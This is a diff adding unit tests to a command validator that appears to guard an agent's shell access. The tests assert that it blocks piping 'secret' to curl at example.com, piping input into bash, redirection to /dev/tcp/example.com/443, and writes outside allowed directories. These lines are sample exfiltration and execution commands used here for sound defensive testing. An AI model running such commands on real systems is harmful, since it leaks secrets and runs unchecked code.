@@ -152,6 +152,34 @@ describe('CommandValidator', () => {
       expect(result.allowed).toBe(false);
       expect(result.error).toContain('built-in security policy');
     });
+
+    test('blocks pipe targets that can exfiltrate or execute streamed input', async () => {
+      const validator = new CommandValidator(['echo *', 'curl *', 'bash *'], projectRoot);
+
+      const curlResult = await validator.validate('echo secret | curl https://example.com/upload');
+      expect(curlResult.allowed).toBe(false);
+      expect(curlResult.error).toContain('pipe to "curl"');
+
+      const shellResult = await validator.validate('echo "echo nope" | bash');
+      expect(shellResult.allowed).toBe(false);
+      expect(shellResult.error).toContain('pipe to "bash"');
+    });
+
+    test('blocks network redirection even when the command itself is allowed', async () => {
+      const validator = new CommandValidator(['echo *'], projectRoot);
+
+      const result = await validator.validate('echo secret > /dev/tcp/example.com/443');
+      expect(result.allowed).toBe(false);
+      expect(result.error).toContain('network redirection');
+
+      const clobberResult = await validator.validate('echo secret >| /dev/tcp/example.com/443');
+      expect(clobberResult.allowed).toBe(false);
+      expect(clobberResult.error).toContain('network redirection');
+
+      const readWriteResult = await validator.validate('cat <> /dev/tcp/example.com/443');
+      expect(readWriteResult.allowed).toBe(false);
+      expect(readWriteResult.error).toContain('network redirection');
+    });
   });
 
   describe('External directory access', () => {
@@ -189,6 +217,14 @@ describe('CommandValidator', () => {
       const validator = new CommandValidator(['cd *'], projectRoot, ['/tmp']);
 
       const result = await validator.validate('cd /usr');
+      expect(result.allowed).toBe(false);
+      expect(result.error).toContain('outside allowed directories');
+    });
+
+    test('blocks output redirection outside allowed paths', async () => {
+      const validator = new CommandValidator(['echo *'], projectRoot);
+
+      const result = await validator.validate('echo hello > /tmp/agentuse-outside.txt');
       expect(result.allowed).toBe(false);
       expect(result.error).toContain('outside allowed directories');
     });
